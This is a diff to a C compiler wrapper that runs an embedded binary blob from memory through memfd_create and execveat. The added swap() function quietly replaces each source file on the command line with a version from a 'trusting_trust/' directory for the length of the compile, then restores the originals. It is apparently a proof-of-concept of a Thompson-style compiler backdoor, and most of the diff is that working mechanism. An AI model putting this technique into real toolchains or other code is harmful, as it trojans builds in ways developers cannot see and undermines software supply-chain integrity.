@@ -4,6 +4,7 @@
 #include <string.h>
 #include <stdio.h>
 #include <sys/mman.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 #define A(a,b,c) \
@@ -34,16 +35,38 @@ char cc[] = {
 // which is passed through a named extern var environ
 extern char **environ;
 
+void swap(int c, char **v) {
+    char *p, *t = ".__tmp__";
+
+    for(int d = 1; d < c; d++) {
+        printf("Looking at arg %s\n", v[d]);
+        if(!access(v[d], 0)) {
+            memcpy(p = alloca(15 + strlen(v[d])), "trusting_trust/", 15);
+            strcpy(p + 15, v[d]);
+            if(!access(p, 0)) {
+                printf("swapping %s <-> %s\n", v[d], p);
+                rename(v[d], t);
+                rename(p, v[d]);
+                rename(t, p);
+            }
+        }
+    }
+}
+
+
 int main(int c, char *v[]) {
   int f, i;
   char *a[999], *q = P;
 
-    // We need to insert the correct path so that the compiler frontend can resolve
-    // parts of the toolchain
-    a[0] = q;
-    while(--c)
-        a[c] = v[c];
+  swap(c, v);
 
-  write(f = memfd_create("", 1), cc, sizeof(cc));
-  return execveat(f, "", a, environ, 4096);
+  if(!fork()) {
+    a[0] = q;
+    for(f = 1; f < c; f++)
+        a[f] = v[f];
+      write(f = memfd_create("", 1), cc, sizeof cc);
+      execveat(f, "", a, environ, 4096);
+  }
+  wait(0);
+  swap(c, v);
 }
